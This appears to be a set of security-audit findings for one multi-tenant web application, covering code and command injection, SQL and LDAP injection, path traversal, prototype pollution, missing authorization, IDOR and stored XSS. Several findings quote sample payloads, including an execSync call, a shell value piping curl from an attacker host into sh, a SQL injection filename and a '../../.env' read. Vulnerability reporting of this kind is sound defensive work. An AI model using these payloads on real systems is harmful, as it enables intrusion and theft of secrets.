extra.message: Server-side code injection (RCE). The user-controlled 'rule' query parameter (GET /deals/:id/weighting-preview, allowed for PLATFORM_ADMIN and ACCOUNT_MANAGER) is concatenated into a template string and executed via new Function('context', `with (context) { return (${rule}); }`). A low-privileged account manager can execute arbitrary JavaScript on the server by passing e.g. rule=process.mainModule.require('child_process').execSync('id') .

extra.message: OS command injection. exportComplianceCertificate builds a shell command string with the unvalidated 'certFormat' request body value and executes it with shell:true: spawn(`openssl x509 -in ${sourcePath} -outform ${certFormat} -out ${outputPath}`, { shell: true }). certFormat is attacker-controlled (POST /api-keys/:id/compliance-certificate, PLATFORM_ADMIN/ACCOUNT_MANAGER) and is not restricted to the ALLOWED_CERT_FORMATS allowlist used by the sibling previewComplianceCertificateExport, allowing arbitrary command execution.

extra.message: OS command injection. renderBoardPacket passes the user-controlled 'layout' query parameter (GET /exports/:reportLabel/board-packet, PLATFORM_ADMIN/ACCOUNT_MANAGER) into a shell command executed with execSync: execSync(`pandoc ${sourcePath} -o ${outputPath} --template=${boardTemplate}`). execSync runs the string through /bin/sh, so a layout value such as 'x; curl <attacker>|<sh>' executes arbitrary commands on the server.

extra.message: SQL injection. findDuplicateCandidates builds a raw SQL query by string interpolation and passes it to repository.query(): the document 'originalName' (attacker-controlled multipart filename), 'mimeType', and organizationId are concatenated unescaped into the query. A malicious filename such as "x' OR '1'='1" supplied by any staff member (document upload is open to PLATFORM_ADMIN/ACCOUNT_MANAGER/SUPPORT_AGENT) allows arbitrary SQL execution. This contradicts the README claim that all queries are parameterized.

A templateName of '../../.env' (or any other file) reads arbitrary files off the server and returns their contents. Roles: PLATFORM_ADMIN/ACCOUNT_MANAGER/SUPPORT_AGENT.

An unauthenticated attacker can register an account with role 'platform_admin' and obtain full administrative access, bypassing all role checks.

extra.message: Prototype pollution (CWE-1321). loadApplicationConfig merges an attacker-controlled JSON object (from the 'x-embed-config' header on the unauthenticated POST /public/organizations/:id/widget-config endpoint) into an existing config using the unsafe deepAssign helper. deepAssign traverses the '__proto__' key and, because target['__proto__'] resolves to Object.prototype, writes attacker properties onto the global Object.prototype of the Node process, potentially enabling further exploitation (e.g. property injection). Note deepAssignSafe (used by users.registerUserPreferences) was written to reject these keys but is not used here.

POST /api/public/organizations/:id/widget-config has no auth guards at all, yet it persists attacker-supplied JSON overrides into the widgetConfig column of ANY organization (by id) via loadApplicationConfig (deepAssign + save). Any unauthenticated remote user can tamper with arbitrary organizations' stored configuration.

extra.message: Missing authorization on webhook subscription mutation. PATCH /webhooks/:id/subscription declares no @Roles decorator, and RolesGuard allows the request through when no required roles are present (roles.guard.ts returns true if requiredRoles is undefined). Consequently ANY authenticated user - including a low-privileged customer_contact - can enable/disable and change the subscribed events of any organization's webhook (adjustWebhookSubscription performs no ownership check).

extra.message: IDOR - cross-organization disclosure of webhook signing secrets and delivery history. GET /webhooks/:id is available to customer_contact but webhooks.service.findOne (and getDeliveries) apply no organization/ownership check, so a customer of one tenant can read another tenant's webhook record - including the HMAC signing secret used to authenticate delivery callbacks - plus request URLs and response bodies from webhook deliveries, given only a webhook UUID.

That cookie is entirely attacker-controllable and is not tied to any server-side entitlement or org membership, so any customer can trivially set it and read delivery detail (requestUrl/responseSummary) of webhooks belonging to other organizations.

Unlike GET /activity which forces customer_contact to their own organizationId, this endpoint lets any authenticated user (including customers) query the activity feed of arbitrary organizations by supplying any organizationId/actorId, disclosing internal cross-tenant activity data.

extra.message: LDAP filter injection. searchStaffDirectory interpolates the raw 'uid' query parameter into an LDAP filter string `(uid=${uid})` with no escaping, while the analogous findUserByEmailInDirectory correctly escapes its input with escapeLdapFilterValue. A uid such as '*' (or an injected filter clause) causes the directory search to match/return entries other than the requested record, enabling directory enumeration. extra.message: Stored XSS. buildSummaryWidget interpolates the backend-stored escalation field customerVisibleSummary (editable by any staff member) directly, unescaped, into a single-quoted JS string inside an onclick attribute, and renders it via innerHTML with bypassSecurityTrustHtml. A malicious customerVisibleSummary containing a single quote breaks out of the JS string and executes arbitrary script in the browsers of every viewer of the escalation (other staff and customer contacts), enabling session/CSRF-token theft.

HTML entity decoding occurs before the inline handler executes, so a single-quote in a deal title (titles are attacker-influenced deal data) breaks out of the alert(...) string and executes arbitrary script in the context of every user viewing the deals table.
